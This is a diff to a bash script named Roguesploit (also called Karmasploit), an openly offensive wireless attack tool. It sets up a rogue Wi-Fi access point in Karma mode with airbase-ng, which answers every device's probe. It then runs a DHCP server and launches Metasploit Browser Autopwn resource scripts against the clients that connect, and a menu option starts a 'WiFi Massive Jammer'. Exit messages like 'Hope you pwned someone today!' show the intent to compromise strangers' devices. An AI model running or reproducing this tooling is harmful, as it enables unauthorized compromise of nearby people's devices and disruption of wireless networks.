@@ -68,11 +68,18 @@ echo -n "Press any key to continue .............."
 read warning
 
 #starting the pwning
-autopwning () {
+
+autopwning1 () {
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf at0
-	msfconsole -q -r $(pwd)/roguepwn.rc
+	msfconsole -q -r $(pwd)/roguepwn1.rc
+}
+autopwning2 () {
+	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+	touch /var/lib/dhcp/dhcpd.leases
+	dhcpd -cf dhcpd.conf at0
+	msfconsole -q -r $(pwd)/roguepwn2.rc
 }
 
 #menu1
@@ -99,13 +106,48 @@ if test $answer1 == '1'
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
 	sudo airmon-ng start wlan1
-	sudo airbase-ng -e "$nameap" -v wlan1mon
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
 	menu
 elif test $answer1 == '2'
 	then
 	clear
-	autopwning
-	menu
+	echo -e $green"Which AutoPwn do you want? "
+	echo -e $yellow" 1. Browser Autopwn 1 "
+	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -ne $red"root@pwningservices: ";tput sgr0
+	read autopwnans
+	if test $autopwnans == '1'
+		then
+		autopwning1
+		clear
+		menu
+	elif test $autopwnans == '2'
+		then
+		autopwning2
+		clear
+		menu
+	else 
+		echo -e $red"[!]  Incorrect Number  [!]"
+		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
+		read back
+		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
+			then
+			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
+			pkill dhcpd
+			pkill airmon-ng
+			pkill airbase-ng
+			ifconfig at0 down
+			sleep 1
+			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
+			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
+			sleep 2
+			clear
+			exit
+		elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'Yes' ]
+			then
+			menu
+		fi
+	fi
 elif test $answer1 == '3'
 	then
 	xterm -title "Wifi Massive Jammer" -fa monaco -bg black -e "./wifijammer.py"
@@ -169,15 +211,14 @@ fi
 #menu2
 clear
 echo -e $yellow"--<"$blue"[*]"$yellow" Roguesploit -- by _B4ckp0r7 "$blue"[*]"$yellow">--"
-echo -e $red"[!] YOU MUST HAVE ALL REQUIREMENTS FOR THIS SCRIPT [!]"
-echo -e $lightgreen"--<[?] What do you want to do? [?]>-- "
+echo -e $lightgreen"--<[?] What do you want to do? [?]>-- ";
 echo -e $lightgreen"       1. Start RogueAP"
 echo -e $lightgreen"       2. Start Pwning Services"
 echo -e $lightgreen"       3. Start WiFi Massive Jammer"
 echo -e $lightgreen"       4. Credits"
 echo -e $lightgreen"       5. Exit"
 echo -e $lightgreen"       6. TUTORIAL"
-echo -ne $yellow"root@B4ckp0r7:"; read answer1
+echo -ne $yellow"root@RogueSploit: "; read answer1
 
 if test $answer1 == '1'
 	then
@@ -186,17 +227,52 @@ if test $answer1 == '1'
 	read nameap
 	sleep 1
 	echo -e $red"[!] YOU NEED WLAN1 INTERFACE FOR THESE [!]"
-	sleep 1
+	sleep 3
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
 	sudo airmon-ng start wlan1
-	sudo airbase-ng -e "$nameap" -v wlan1mon
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
 	menu
 elif test $answer1 == '2'
 	then
 	clear
-	autopwning
-	menu
+	echo -e $green"Which AutoPwn do you want? "
+	echo -e $yellow" 1. Browser Autopwn 1 "
+	echo -e $blue" 2. Browser Autopwn 2 "
+	echo -ne $red"root@pwningservices: ";tput sgr0
+	read autopwnans
+	if test $autopwnans == '1'
+		then
+		autopwning1
+		clear
+		menu
+	elif test $autopwnans == '2'
+		then
+		autopwning2
+		clear
+		menu
+	else 
+		echo -e $red"[!]  Incorrect Number  [!]"
+		echo -n -e $yellow"  Do you want exit? ( Yes / No ) :"
+		read back
+		if [ $back != 'n' ] && [ $back != 'N' ] && [ $back != 'No' ]
+			then
+			echo -e $red"--<[*] Stopping all service , Wait... [*]>--"
+			pkill dhcpd
+			pkill airmon-ng
+			pkill airbase-ng
+			ifconfig at0 down
+			sleep 1
+			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
+			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
+			sleep 2
+			clear
+			exit
+		elif [ $back != 'y' ] && [ $back != 'Y' ] && [ $back != 'Yes' ]
+			then
+			menu
+		fi
+	fi
 elif test $answer1 == '3'
 	then
 	xterm -title "Wifi Massive Jammer" -fa monaco -bg black -e "./wifijammer.py"
@@ -214,6 +290,7 @@ elif test $answer1 == '4'
 elif test $answer1 == '5'
 	then
 	clear
+	pkill dnsmasq
 	pkill dhcpd
 	pkill airmon-ng
 	pkill airbase-ng
@@ -224,7 +301,7 @@ elif test $answer1 == '5'
 	exit
 elif test $answer1 == '6'
 	then
-	echo -e $white" TUTORIAL FOR ROGUEPLOIT"
+	echo -e $white" TUTORIAL FOR ROGUESPLOIT"
 	echo -e $yellow" 1) OPEN 2 DIFFERENT TERMINALS;"
 	echo -e $yellow" 2) START THE SCRIPT AND SELECT ROGUE AP (Option 1) ON FIRST TERMINAL;"
 	echo -e $yellow" 3) IN THE SECOND TERMINAL SELECT PWNING SERVICES (Option 2)"
